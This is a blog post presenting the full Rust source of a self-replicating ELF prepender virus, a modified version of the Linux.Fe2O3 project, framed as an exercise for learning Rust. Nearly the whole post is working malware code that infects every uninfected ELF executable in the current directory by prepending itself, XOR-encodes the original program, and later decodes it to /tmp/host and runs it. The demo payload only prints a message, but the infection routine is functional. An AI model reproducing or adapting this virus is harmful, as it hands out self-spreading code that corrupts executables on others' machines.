Title: ELF prepender
Date: 2020-1-2 10:01
Modified: 2020-1-2 10:01
Category: misc
Tags: rust, elf, linux 
Slug: elf_prepender
Authors: F3real
Summary: Simple rust ELF prepender

Recently I have found interesting post on [reddit](https://www.reddit.com/r/rust/comments/d0hbsp/linuxfe2o3_a_rust_virus/) about \`virus\` written in rust. It simply infects all ELF files in current directory using basic prepending technique. The infected program, when run, will XOR decode real code and run it from temp folder.

Since it is open source, it actually makes a pretty good exercise if you want to learn more about rust while tinkering with something. The original code is not really idiomatic but `cargo clippy` and reddit comments can serve as a guide if you want to improve it.

My slightly modified version is bellow (proper error handling would require bigger rework).

~~~rust
use std::ffi::{OsStr, OsString};
use std::fs::File;
use std::io::prelude::*;
use std::io::{Read, SeekFrom, Write};
use std::os::unix::fs::OpenOptionsExt;
use std::process::Command;
use std::{env, fs, process};

const ELF_MAGIC: &[u8; 4] = &[0x7f, 0x45, 0x4c, 0x46]; // b"\x7FELF"

const PLAIN_HOST_PATH: &str = "/tmp/host";
const INFECTION_MARK: &[u8; 5] = &[0x40, 0x54, 0x4d, 0x5a, 0x40]; // @TMZ@
const XOR_KEY: &[u8; 5] = &[0x46, 0x65, 0x32, 0x4f, 0x33]; // Fe2O3
const VIRUS_SIZE: u64 = 2_677_560;

fn payload() {
    println!("Infected!!!");
}

fn read_file(path: &OsStr) -> Vec<u8> {
    let mut buf = Vec::new();
    if let Ok(mut f) = File::open(path) {
        f.read_to_end(&mut buf).unwrap();
    }
    buf
}

fn xor_enc_dec(mut input: Vec<u8>) -> Vec<u8> {
    for i in 0..input.len() {
        input[i] ^= XOR_KEY[i % XOR_KEY.len()];
    }
    input
}

fn is_elf(path: &OsStr) -> bool {
    // this will work for PIE executables as well
    // but can fail for shared libraries during execution
    let mut ident = [0; 4];
    match File::open(path) {
        Ok(mut f) => match f.read_exact(&mut ident) {
            Ok(_) => &ident == ELF_MAGIC,
            Err(_) => false,
        },
        Err(_) => false,
    }
}

fn is_infected(path: &OsStr) -> bool {
    let buf = read_file(path);
    match buf
        .windows(INFECTION_MARK.len())
        .position(|window| window == INFECTION_MARK)
    {
        Some(_) => true,
        _ => false,
    }
}

fn infect(virus: &OsString, target: &OsStr) {
    let host_buf = read_file(target);
    if host_buf.is_empty() {
        return;
    }
    let encrypted_host_buf = xor_enc_dec(host_buf);
    let mut virus_buf = vec![0; VIRUS_SIZE as usize];

    if let Ok(mut f) = File::open(virus) {
        if f.read_exact(&mut virus_buf).is_ok() {
            let mut infected = File::create(target).unwrap();
            infected.write_all(&virus_buf).unwrap();
            infected.write_all(&encrypted_host_buf).unwrap();
        }
    }
}

fn run_infected_host(path: &OsString) {
    let mut encrypted_host_buf = Vec::new();
    let mut infected = File::open(path).unwrap();

    let mut plain_host = fs::OpenOptions::new()
        .create(true)
        .write(true)
        .mode(0o755)
        .open(PLAIN_HOST_PATH)
        .unwrap();
    infected.seek(SeekFrom::Start(VIRUS_SIZE)).unwrap();
    infected.read_to_end(&mut encrypted_host_buf).unwrap();
    drop(infected);

    let decrypted_host_buf = xor_enc_dec(encrypted_host_buf);
    plain_host.write_all(&decrypted_host_buf).unwrap();
    plain_host.sync_all().unwrap();
    plain_host.flush().unwrap();

    drop(plain_host);
    Command::new(PLAIN_HOST_PATH).status().unwrap();
    fs::remove_file(PLAIN_HOST_PATH).unwrap();
}

fn main() {
    let args: Vec<String> = env::args().collect();
    let myself = OsString::from(&args[0]);

    if let Ok(current_dir) = env::current_dir() {
        for entry in fs::read_dir(current_dir).unwrap() {
            let entry = entry.unwrap();
            let path = entry.path();
            let metadata = fs::metadata(&path).unwrap();

            if metadata.is_file() {
                let entry_name = path.file_name().unwrap();
                if myself == entry_name {
                    continue;
                }
                if is_elf(entry_name) && !is_infected(entry_name) {
                    infect(&myself, entry_name);
                }
            }
        }
    }

    if fs::metadata(&myself).unwrap().len() > VIRUS_SIZE {
        payload();
        run_infected_host(&myself);
    } else {
        process::exit(0)
    }
}
~~~